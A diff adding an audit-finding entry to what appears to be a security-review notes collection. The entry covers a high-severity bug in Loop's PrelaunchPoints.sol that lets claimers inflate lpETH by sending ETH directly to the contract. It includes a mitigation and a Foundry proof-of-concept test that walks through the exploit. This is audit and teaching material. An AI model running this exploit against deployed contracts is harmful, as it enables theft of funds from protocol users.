@@ -206,3 +206,39 @@ Authors: [Eta](https://twitter.com/pwhattie), looking forward to your joining
   ```
 
   </details>
+
+## 4.[High] Availability of deposit invariant can be bypassed
+
+### ETH deposits influence lpETH minting
+
+- Summary: The issue in the PrelaunchPoints.sol contract arises during the claiming of lpETH, where non-ETH/WETH LRT tokens are swapped to ETH using \_fillQuote(), and this ETH is subsequently used to mint lpETH. The vulnerability occurs because any ETH transferred directly to the contract before calling claim() is also included in the minting calculation. This allows users to bypass the intended lock-up period and artificially inflate their lpETH holdings beyond their initial LRT stake.
+
+- Impact & Recommendation: To mitigate this, it is crucial to modify the contract so that only ETH obtained from LRT swaps is used for minting lpETH, and to prevent any additional ETH deposits from influencing the lpETH minting process.
+  <br> 🐬: [Source](https://code4rena.com/reports/2024-05-loop#h-01-availability-of-deposit-invariant-can-be-bypassed) & [Report](https://code4rena.com/reports/2024-05-loop)
+
+  <details><summary>POC</summary>
+
+  ```solidity
+      function testClaimLRT() public {
+        // user only needs to lock 1 wei LRT, then he could cliam any amount he want
+        uint256 lockAmount = 1;
+        lrt.approve(address(prelaunchPoints), lockAmount);
+        prelaunchPoints.lock(address(lrt), lockAmount, referral);
+
+        prelaunchPoints.setLoopAddresses(address(lpETH), address(lpETHVault));
+        vm.warp(prelaunchPoints.loopActivation() + prelaunchPoints.TIMELOCK() + 1);
+        prelaunchPoints.convertAllETH();
+
+        vm.warp(prelaunchPoints.startClaimDate() + 1);
+        bytes4 y =  bytes4(0x415565b0);
+        bytes memory da = abi.encodeWithSelector(y, address(lrt), (ETH), 0);
+        // user deposit eth to this and call claim to get lp
+        address(prelaunchPoints).call{value: 1 ether}("");
+        prelaunchPoints.claim(address(lrt), 0, PrelaunchPoints.Exchange.TransformERC20, da);
+
+        console.log("lp get : ",lpETH.balanceOf(address(this)));
+    }
+
+  ```
+
+  </details>
